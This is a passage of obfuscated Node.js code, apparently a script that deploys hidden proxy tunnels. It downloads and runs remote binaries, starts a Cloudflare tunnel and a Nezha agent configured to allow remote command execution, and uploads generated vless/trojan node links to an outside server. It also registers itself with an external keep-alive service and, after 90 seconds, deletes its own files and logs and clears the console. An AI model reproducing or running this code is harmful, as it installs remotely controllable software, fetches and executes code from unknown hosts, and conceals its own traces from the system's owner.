irefox','fileName','Unhandled\x20error\x20in\x20startserver:','\x0a\x20\x20\x20\x20','https://amd64.ssss.nyc.mn/bot','floor','\x20successfully','cf.930318.xyz','quic','pkill\x20-f\x20\x22[','tcp','trim','/api/delete-nodes','finish','&fp=firefox&type=ws&host=','message','\x20>/dev/null\x202>&1','Error\x20executing\x20command:\x20','config.json','http\x20server\x20is\x20running\x20on\x20port:','\x0avless://','1043100fTMIPc','arm','axios','https://oooo.serv00.net/add-url','express','/tunnel.yml\x20run','?security=tls&sni=','filter','/trojan-argo','\x20failed:\x20','CFPORT','Error\x20downloading\x20files:','&path=%2Fvless-argo%3Fed%3D2560#','arm64','tunnel.json','NEZHA\x20variable\x20is\x20empty,skip\x20running','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','true','has','\x20-p\x20','267818wMNTFJ','status','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','false','length','join','/config.json\x20>/dev/null\x202>&1\x20&','taskkill\x20/f\x20/im\x20','?encryption=none&security=tls&sni=','5LPOaUL','arch','\x20-c\x20\x22','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','automatic\x20access\x20task\x20added\x20successfully','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','charAt','boot.log','post'];_0x42e6=function(){return _0x2adf33;};return _0x42e6();}async function uploadNodes(){const _0x238e4a={_0x23d5f9:0xa2,_0x32f48c:0xa9,_0x2af745:0xc7,_0x42b8c3:0x141,_0x1719d4:0xc4,_0x17c1c6:0xa2,_0xf0df14:0x14a},_0x45cd01=_0x5f3a41;if(UPLOAD_URL&&PROJECT_URL){const _0x34e46e=PROJECT_URL+'/'+SUB_PATH,_0x572865={'subscription':[_0x34e46e]};try{const _0x589e4f=await axios['post'](UPLOAD_URL+'/api/add-subscriptions',_0x572865,{'headers':{'Content-Type':_0x45cd01(0xdd)}});return _0x589e4f&&_0x589e4f['status']===0xc8?(console[_0x45cd01(_0x238e4a._0x23d5f9)]('Subscription\x20uploaded\x20successfully'),_0x589e4f):null;}catch(_0x2d8fdc){if(_0x2d8fdc[_0x45cd01(0xca)]){if(_0x2d8fdc[_0x45cd01(0xca)][_0x45cd01(0x130)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x45cd01(0xde)](listPath))return;const _0x4a47ee=fs[_0x45cd01(_0x238e4a._0x32f48c)](listPath,'utf-8'),_0x2d3aa5=_0x4a47ee[_0x45cd01(_0x238e4a._0x2af745)]('\x0a')['filter'](_0x4494ff=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x45cd01(0xfd)](_0x4494ff));if(_0x2d3aa5[_0x45cd01(0x134)]===0x0)return;const _0x557d2a=JSON[_0x45cd01(0xc8)]({'nodes':_0x2d3aa5});try{const _0x3bb5c2=await axios[_0x45cd01(_0x238e4a._0x42b8c3)](UPLOAD_URL+_0x45cd01(_0x238e4a._0x1719d4),_0x557d2a,{'headers':{'Content-Type':_0x45cd01(0xdd)}});return _0x3bb5c2&&_0x3bb5c2[_0x45cd01(0x130)]===0xc8?(console[_0x45cd01(_0x238e4a._0x17c1c6)](_0x45cd01(_0x238e4a._0xf0df14)),_0x3bb5c2):null;}catch(_0x129986){return null;}}else return;}}function cleanFiles(){const _0x2cdc07={_0x322e56:0xd8,_0x1c8885:0xbb};setTimeout(()=>{const _0x45d897={_0x8b628c:0xa2,_0x1f58f8:0xe2},_0x48f85f={_0x3a6939:0x146,_0x5571c3:0xe2},_0x519d4c=_0x2fc7,_0x1087d6=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x1087d6['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x1087d6[_0x519d4c(0xae)](phpPath);process[_0x519d4c(_0x2cdc07._0x322e56)]==='win32'?exec('del\x20/f\x20/q\x20'+_0x1087d6['join']('\x20')+'\x20>\x20nul\x202>&1',_0x4e0cb3=>{const _0x5a06fe=_0x519d4c;console[_0x5a06fe(_0x48f85f._0x3a6939)](),console[_0x5a06fe(0xa2)]('App\x20is\x20running'),console['log'](_0x5a06fe(_0x48f85f._0x5571c3));}):exec(_0x519d4c(_0x2cdc07._0x1c8885)+_0x1087d6[_0x519d4c(0x135)]('\x20')+_0x519d4c(0x116),_0x1ee458=>{const _0x43b8f6=_0x519d4c;console['clear'](),console[_0x43b8f6(_0x45d897._0x8b628c)]('App\x20is\x20running'),console['log'](_0x43b8f6(_0x45d897._0x1f58f8));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x49e481={_0x41f0af:0x11e,_0x1cc608:0x13d,_0xf28a16:0xad,_0x49ee52:0x115},_0x2d9187=_0x5f3a41;if(!AUTO_ACCESS||!PROJECT_URL){console['log']('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0xe9c690=await axios['post'](_0x2d9187(_0x49e481._0x41f0af),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x2d9187(0xa2)](_0x2d9187(_0x49e481._0x1cc608)),_0xe9c690;}catch(_0x3a7f2f){return console[_0x2d9187(_0x49e481._0xf28a16)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x3a7f2f[_0x2d9187(_0x49e481._0x49ee52)]),null;}}async function startserver(){const _0x17d81b={_0x53aa56:0x9a},_0x529af2=_0x5f3a41;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x312069){console['error'](_0x529af2(_0x17d81b._0x53aa56),_0x312069);}}startserver()[_0x5f3a41(0xee)](_0x1a437b=>{const _0x1c6a18={_0xd7fc09:0x108},_0x181718=_0x5f3a41;console['error'](_0x181718(_0x1c6a18._0xd7fc09),_0x1a437b);}),app[_0x5f3a41(0xba)](PORT,()=>console[_0x5f3a41(0xa2)](_0x5f3a41(0x119)+PORT+'!'));
